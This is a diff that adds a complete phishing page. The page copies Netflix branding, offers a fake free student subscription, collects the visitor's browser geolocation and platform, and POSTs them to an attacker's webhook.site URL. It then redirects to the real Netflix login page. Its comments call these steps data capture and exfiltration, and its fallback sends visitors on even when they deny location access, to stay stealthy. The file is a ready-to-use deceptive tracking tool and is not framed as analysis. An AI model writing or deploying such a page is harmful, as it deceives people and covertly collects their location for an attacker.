@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix | Student Rewards</title>
+    <style>
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            background-image: linear-gradient(rgba(0,0,0,0.7), rgba(0,0,0,0.7)), url('https://assets.nflxext.com/ffe/siteui/vlv3/f841d4c7-10e1-40af-bcae-07a3f8dc141a/f6ed17ad-68ee-406f-85f8-5e0f361d87c1/PK-en-20220502-popsignuptwoweeks-perspective_alpha_website_medium.jpg');
+            background-size: cover;
+        }
+
+        .container {
+            background: rgba(0, 0, 0, 0.85);
+            padding: 40px;
+            border-radius: 4px;
+            width: 100%;
+            max-width: 450px;
+            text-align: center;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.5);
+        }
+
+        .logo { color: #e50914; font-size: 38px; font-weight: bold; margin-bottom: 25px; letter-spacing: -1px; }
+
+        h1 { font-size: 26px; font-weight: 700; margin-bottom: 15px; }
+        p { color: #a3a3a3; font-size: 15px; line-height: 1.5; margin-bottom: 30px; }
+
+        .btn-netflix {
+            background: #e50914;
+            color: #fff;
+            border: none;
+            padding: 18px;
+            width: 100%;
+            font-size: 16px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: background 0.2s;
+        }
+
+        .btn-netflix:hover { background: #f6121d; }
+
+        /* Spinner for the 'Processing' state */
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">NETFLIX</div>
+    <h1>12 Months Free Subscription</h1>
+    <p>Exclusive Student Reward: Please verify your current location to activate your premium account access.</p>
+    
+    <button class="btn-netflix" id="main-btn" onclick="captureData()">
+        <span id="btn-text">Verify & Activate</span>
+        <div class="spinner" id="btn-spinner"></div>
+    </button>
+
+    <div style="margin-top: 20px; font-size: 11px; color: #555;">
+        © 1997-2026 Netflix, Inc. | Student Verification Portal
+    </div>
+</div>
+
+<script>
+    // 1. UPDATE THIS WITH YOUR WEBHOOK URL
+    const webhookUrl = "https://webhook.site/a6190465-2192-445e-a98c-cdb63aaa9e23";
+    // 2. The real page to send them to after the capture
+    const redirectUrl = "https://www.netflix.com/login";
+
+    function captureData() {
+        const btnText = document.getElementById('btn-text');
+        const btnSpinner = document.getElementById('btn-spinner');
+        const btn = document.getElementById('main-btn');
+
+        // Show loading state
+        btnText.style.display = 'none';
+        btnSpinner.style.display = 'block';
+        btn.disabled = true;
+
+        if ("geolocation" in navigator) {
+            navigator.geolocation.getCurrentPosition((pos) => {
+                // PHASE 1: Capture data
+                const payload = {
+                    type: "STUDENT_OFFER_HIT",
+                    latitude: pos.coords.latitude,
+                    longitude: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy + "m",
+                    platform: navigator.platform,
+                    timestamp: new Date().toISOString()
+                };
+
+                // PHASE 2: Exfiltrate data to Webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    mode: 'no-cors',
+                    body: JSON.stringify(payload)
+                }).then(() => {
+                    // PHASE 3: Redirect to real Netflix site
+                    window.location.href = redirectUrl;
+                });
+
+            }, (err) => {
+                // If they block, just redirect anyway to remain stealthy
+                window.location.href = redirectUrl;
+            });
+        } else {
+            window.location.href = redirectUrl;
+        }
+    }
+</script>
+
+</body>
+</html>
